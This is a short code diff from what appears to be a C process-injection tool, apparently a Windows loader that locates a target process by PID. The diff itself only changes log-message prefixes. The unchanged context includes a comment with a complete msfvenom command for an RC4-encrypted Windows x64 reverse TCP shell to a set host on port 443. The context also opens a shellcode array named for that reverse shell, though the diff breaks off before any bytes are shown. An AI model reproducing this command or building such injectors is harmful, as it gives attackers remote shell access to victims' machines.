@@ -4,8 +4,8 @@
 #include "find_pid.h"
 
 const char* k = "[+]";
-const char* i = "[+]";
-const char* e = "[+]";
+const char* i = "[*]";
+const char* e = "[-]";
 
 //msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=172.19.59.54 LPORT=443 RC4PASSWORD=PASS EXITFUNC=thread -f c --var-name=ucReverseShell
 unsigned char ucReverseShell[] =
